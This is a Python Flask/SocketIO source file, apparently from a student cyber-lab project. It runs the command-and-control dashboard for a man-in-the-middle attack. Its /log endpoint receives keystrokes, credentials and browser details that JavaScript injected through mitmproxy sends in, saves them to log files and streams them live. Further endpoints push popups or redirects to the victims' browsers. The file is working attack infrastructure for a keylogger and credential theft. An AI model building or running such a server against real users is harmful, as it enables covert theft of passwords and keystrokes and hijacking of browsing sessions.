from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from datetime import datetime
import os
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'fyp-cyberlab-secret-2026'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

LOG_FOLDER = "/home/kali/mitm-logs"
os.makedirs(LOG_FOLDER, exist_ok=True)

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

# Receive data from mitmproxy injected JS
@app.route('/log', methods=['POST'])
def receive_log():
    try:
        data = request.get_json()
        log_type = data.get('type')
        timestamp = datetime.now().strftime("%H:%M:%S")

        # Save to file
        with open(f"{LOG_FOLDER}/{log_type}.log", "a") as f:
            f.write(f"[{timestamp}] {json.dumps(data, ensure_ascii=False)}\n")

        # Send live to dashboard
        if log_type == "keystroke":
            socketio.emit('new_keystroke', {"time": timestamp, "data": data.get('data'), "url": data.get('url')})
        elif log_type == "credentials":
            socketio.emit('new_credential', {"time": timestamp, "data": data.get('data')})
        elif log_type == "browser_info":
            socketio.emit('new_info', {"time": timestamp, "data": data.get('data')})

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

# Command endpoints (for future control)
@app.route('/command/popup', methods=['POST'])
def send_popup():
    msg = request.form.get('message', 'Session Compromised!')
    socketio.emit('command', {'action': 'popup', 'message': msg})
    return "Popup command sent!"

@app.route('/command/redirect', methods=['POST'])
def send_redirect():
    url = request.form.get('url', 'https://google.com')
    socketio.emit('command', {'action': 'redirect', 'url': url})
    return f"Redirect to {url} sent!"

if __name__ == '__main__':
    print("🚀 FYP Dashboard Running → http://localhost:5002")
    print("Logs saved in: ~/mitm-logs")
    socketio.run(app, host='0.0.0.0', port=5002, debug=False)
